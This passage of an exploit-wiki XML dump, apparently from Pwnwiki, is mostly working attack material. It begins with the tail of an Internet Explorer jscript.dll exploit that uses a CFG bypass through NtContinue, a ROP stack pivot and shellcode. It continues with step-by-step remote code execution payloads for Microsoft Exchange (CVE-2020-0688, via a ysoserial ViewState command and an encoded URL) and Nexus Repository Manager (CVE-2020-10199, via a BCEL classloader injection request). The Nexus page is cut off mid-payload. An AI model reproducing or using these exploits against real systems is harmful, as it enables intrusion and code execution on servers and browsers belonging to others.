        ShellcodeStr = ShellcodeStr.substr(0, ShellcodeStr.length); // This trick is essential to ensure the "address of" primitive gets the actual address of the shellcode data and not another VAR in a chain of VARs (this happens when a VAR is appended to another repeaatedly as is the case here)
        var ShellcodeAddress = LeakObjectAddress64(LeakedVvalAddress, ShellcodeStr);
        
        /*
        Artificial stack data for use beyond the NTDLL.DLL!NtContinue pivot.
        
                                             
        NTDLL.DLL!NtContinue --------------------&gt; RIP = &lt;MSVCRT.DLL!0x00019baf&gt; | MOV RSP, R11; RET
                                                   RCX = Shellcode address
                                                   RDX = Shellcode size
                                                   R8 = 0x40
                                                   R9 = Leaked address of BSTR to hold out param    
                                                   RSP = Real stack pointer             
                                                   R11 = Artificial stack
        |-----------------------------|            ^
        | 2MB stack space (heap)      |            |
        |-----------------------------|            |
        | Heap header/BSTR len align  |            |
        |-----------------------------|            |
        | KERNEL32.DLL!VirtualProtect | &lt;----------|
        |-----------------------------|
        | Shellcode return address    ]
        |-----------------------------|                                    
        */
        
        var Padding = Array(0x100000 + 1).join('\u0101'); // The +1 here always gives it a clean len (used to be -1)
        var ArtificialStackStr = Padding; // A couple KB were never enough, even for VirtualProtect and WinExec. The WPAD RPC client shellcode for sandbox escape is exceptionally consumptive with stack memory.
        ArtificialStackStr += DwordArrayToBytes([VirtualProtectAddress.low]);
        ArtificialStackStr += DwordArrayToBytes([VirtualProtectAddress.high]);
        ArtificialStackStr += DwordArrayToBytes([ShellcodeAddress.low]);
        ArtificialStackStr += DwordArrayToBytes([ShellcodeAddress.high]);
        ArtificialStackStr = ArtificialStackStr.substr(0, ArtificialStackStr.length);
        var ArtificialStackAddress = LeakObjectAddress64(LeakedVvalAddress, ArtificialStackStr);
        ArtificialStackAddress.low += ((ArtificialStackStr.length * 2) - 0x10); // Point RSP at the return address to the shellcode. The address consistently ends up an 0x8 multiple on Windows 7 IE8 64-bit. Stack overfloow exceptions were becoming an issue when I did not include this tail padding.
        
        var WritableStr = "";
        WritableStr += DwordArrayToBytes([0]);
        WritableStr = WritableStr.substr(0, WritableStr.length);
        var WritableAddress = LeakObjectAddress64(LeakedVvalAddress, WritableStr);
        
        // Dynamically resolve ROP gadget for stack pivot via export hint
    
        var StackPivotAddress;
        var HintExportAddress = ResolveExport64(MsvcrtBase, [ 0x686e6174, 0x00000066 ]); // tanhf
        var MagicOffset;
        
        if(!HintExportAddress.low &amp;&amp; !HintExportAddress.high) {
            DebugLog("Failed to resolve address of MSVCRT.DLL!tanhf");
            return 0;
        }
        
        if(WindowsVersion &lt;= 7) {
            MagicOffset = 0x2da + 1; // tanhf:0x00076450 (+0x2da) &lt;- 0x0007672a -&gt; (+0x3e5e) ??_7bad_cast@@6B@:0x0007a588
        }
        else {
            MagicOffset = 0x11f + 19; // tanhf:0x00019a90 (+0x11f) &lt;- 0x00019baf -&gt; (+0x31) acosf:0x00019be0
        }
        
        // 49:8BE3 | mov rsp,r11
        // C3      | ret
        
        StackPivotAddress = HarvestGadget64(HintExportAddress, 0x500, 0xC3E38B49, 0x00000000FFFFFFFF, MagicOffset);
        
        if(!StackPivotAddress.low &amp;&amp; !StackPivotAddress.high) {
            DebugLog("Failed to resolve address of stack pivot gadget");
            return 0;
        }
        
        DebugLog("Gadget address of stack pivot: 0x" + StackPivotAddress.high.toString(16) + StackPivotAddress.low.toString(16));
        Context = MakeContextDEPBypass64(LeakedStackPtr, ArtificialStackAddress, StackPivotAddress, VirtualProtectAddress, ShellcodeAddress, ShellcodeLen, WritableAddress);
        DebugLog("Artificial stack pointer address at 0x" + ArtificialStackAddress.high.toString(16) + " " + ArtificialStackAddress.low.toString(16) +" shellcode at 0x" + ShellcodeAddress.high.toString(16) + ShellcodeAddress.low.toString(16) + " CONTEXT pointer: 0x" + FakeObjAddress.high.toString(16) + FakeObjAddress.low.toString(16));
    }
    else if(PayloadType == "winexec") {
        CommandStr = CommandStr.substr(0, CommandStr.length);
        var CommandStrAddress = LeakObjectAddress64(LeakedVvalAddress, CommandStr);
        Context = MakeContextWinExec64(CommandStrAddress, LeakedStackPtr, WinExecAddress);
    }
    
    var RipHijackPropName = CreateVar64(0x81, LeakedVvalAddress.low + 96, LeakedVvalAddress.high, 0, 0) + CreateVar64(0, FakeVtableAddress.low, FakeVtableAddress.high, 0, 0) + Context; // 96 is the 64-bit prop name offset plus size of mutable VAR and next VAR Type field.
    
    /*
    
    jscript.dll!Object.Typeof method
    
    mov rdi,qword ptr ds:[rdi+8]
    mov rax,qword ptr ds:[rdi]
    mov rbx,qword ptr ds:[rax+138]
    mov rcx,rbx
    call qword ptr ds:[7FFA554EC628]
    mov rcx,rdi
    call rbx
    
    Initially RDI holds the pointer to the mutable VAR. Its object pointer is being loaded from +8, and then
    RDI holds the pointer to the fake Object, which is dereferenced into RAX to obtain the vtable pointer.
    Offset 0x138 holds the typeof method pointer within the vtable, which is subsequently passed to CFG 
    for validation.
    
    Since the fake vtable holds the address of NTDLL.DLL!NtContine in place of its typeof method (and this
    address is whitelisted by CFG) the security check will succeed and we will end up with an indirect branch
    instruction (CALL RBX) whch will execute the RIP hijack.
    
    Most notably, since a class method will always be passed its "this" pointer as its first parameter (which
    in x64 will be held in RCX) we not only end up with a RIP hijack but also control of the RCX register.
    Control of this register allows us to control the first parameter to NTDLL.DLL!NtContinue (in this case
    a CONTEXT structure pointer) which conveniently will hold a pointer to our fake object, the contents of
    which we control. Thus the fake object itself will be interpreted as CONTEXT struct we may control.

    Malicious VVAL property name
    ------------------
    | VAR.Type       | &lt;-- Mutable var
    |----------------|   |
    | VAR.ObjPtr     | &lt;------ Referencing fake object appended to itself in the VVAL property name
    |----------------|     |
    | VAR.Type       |     |-- Not a real VAR (its Type is skipped and never referenced), just a 0 field. 
    |----------------|     |
    | Fake vtable ptr| &lt;---|-- Fake object begins here. RCX and RDI point here
    |----------------|
    | VAR.NextPtr    | &lt;-- Unreferenced, a side-effect of using a VAR struct to initialize the fake object.
    |----------------|
    | CONTEXT        | &lt;-- Notably the first 16 bytes (2 QWORDs) of this struct will be confused with the fake vtable ptr and VAR.NextPtr fields. These fields represent the P1Home and P2Home registers and its fine if they are initialized to 0.
    |________________|

    */
    
    ReClaimNameList(0, RipHijackPropName);
    var TotalTime = (new Date().getTime() - ScriptTimeStart);
    DebugLog("TIME ... total time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
    typeof MutableVar;
}

function FindProxyForURL(url, host){
    return "DIRECT";
}

Exploit();
&lt;/pre&gt;</text>
      <sha1>ageqva178g587sejjjqmpcukb05w53i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-0688 微軟EXCHANGE服務遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1315</id>
    <revision>
      <id>1654</id>
      <timestamp>2021-04-14T07:55:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== exchange 2010、2013、2016、2019  ==漏洞利用== 1、獲取ViewStateUserKey值 &lt;pre&gt; /ecp/default.aspx &lt;/pre&gt; F12打開開發工具的Network選項，然..."</comment>
      <origin>1654</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2520" sha1="ry90o3kwida3vlsancepz0lyo2mwsm9" xml:space="preserve">==影響版本==
exchange 2010、2013、2016、2019

==漏洞利用==
1、獲取ViewStateUserKey值
&lt;pre&gt;
/ecp/default.aspx
&lt;/pre&gt;
F12打開開發工具的Network選項，然後按F5重新發送請求。我們需要找到/ecp/default.aspx的響應（NET_SessionId）

2、獲取取VIEWSTATEGENERATOR值：
同樣在/ecp/default.aspx的響應包內，直接搜索關鍵詞即可。

或使用document.getElementById("VIEWSTATEGENERATOR").value

如果發現沒有改字段，是因為系統沒有安裝KB2919355補丁，更新該補丁後可顯示，但是該字段值基本唯一，不需要刻意獲得。

3.整理已知參數
--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默認，漏洞產生原因）
--validationalg = SHA1（默認，漏洞產生原因）
--generator = B97B4E27（基本默認）
--viewstateuserkey = d673d1a4-1794-403e-ab96-e283ca880ef2（手工獲取，變量，每次登陸都不一致）

4.生成payload:
&lt;pre&gt;
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="d673d1a4-1794-403e-ab96-e283ca880ef2" --isdebug --islegacy
&lt;/pre&gt;

上面ysoserial.exe生成的payload要用URL Encode編碼


完整示例：
&lt;pre&gt;
https://192.168.1.248/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4Lp73ado0NJN2PSSnfOoN9h4H7xCU%3D
&lt;/pre&gt;

成功彈出計算器。</text>
      <sha1>ry90o3kwida3vlsancepz0lyo2mwsm9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-10199 Nexus Repository Manger group 後台遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>5634</id>
    <revision>
      <id>6474</id>
      <timestamp>2021-07-08T06:24:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;!--T:1--&gt; &lt;/translate&gt; &lt;pre&gt; Nexus &lt; 3.21.1 &lt;/pre&gt;  ==FOFA== &lt;pre&gt; app="Nexus-Repository-Manager" &lt;/pre&gt; &lt;translate&gt; ==前提條件..."</comment>
      <origin>6474</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5665" sha1="rwtt6of38x9gg2jp9obpa6xqdglgg1i" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Nexus &lt; 3.21.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
app="Nexus-Repository-Manager"
&lt;/pre&gt;
&lt;translate&gt;
==前提條件==
&lt;/translate&gt;
&lt;translate&gt;
漏洞觸發需要任意賬戶權限
&lt;/translate&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;
&lt;translate&gt;
登錄任意用戶後修改 NXSESSIONID，發送請求包
&lt;/translate&gt;
&lt;pre&gt;
POST /service/rest/beta/repositories/go/group HTTP/1.1
Host: 
Connection: keep-alive
NX-ANTI-CSRF-TOKEN: 0.6153568974227819
Content-Length: 4789
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
Content-Type: application/json
404: "id"
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=66e8bf5f-0544-4d7d-b1d7-970ce5158aff


{
        "name": "internal",
        "online": true,
        "storage": {
            "blobStoreName": "default",
            "strictContentTypeValidation": true
        },
        "group": {
            "memberNames": ["${' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}"]
        }
}


&lt;/pre&gt;
&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://short.pwnwiki.org/?c=Al2liL</text>
      <sha1>rwtt6of38x9gg2jp9obpa6xqdglgg1i</sha1>
    </revision>
    <revision>
      <id>6475</id>
      <parentid>6474</parentid>
      <timestamp>2021-07-08T06:25:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6475</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5720" sha1="m2hsz0sw3zy3bzq491yih9cq5jzu3u8" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Nexus &lt; 3.21.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
app="Nexus-Repository-Manager"
&lt;/pre&gt;
&lt;translate&gt;
==前提條件== &lt;!--T:2--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:3--&gt;
漏洞觸發需要任意賬戶權限
&lt;/translate&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:4--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:5--&gt;
登錄任意用戶後修改 NXSESSIONID，發送請求包
&lt;/translate&gt;
&lt;pre&gt;
POST /service/rest/beta/repositories/go/group HTTP/1.1
Host: 
Connection: keep-alive
NX-ANTI-CSRF-TOKEN: 0.6153568974227819
Content-Length: 4789
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
Content-Type: application/json
404: "id"
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=66e8bf5f-0544-4d7d-b1d7-970ce5158aff


{
        "name": "internal",
        "online": true,
        "storage": {
            "blobStoreName": "default",
            "strictContentTypeValidation": true
        },
        "group": {
            "memberNames": ["${' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$9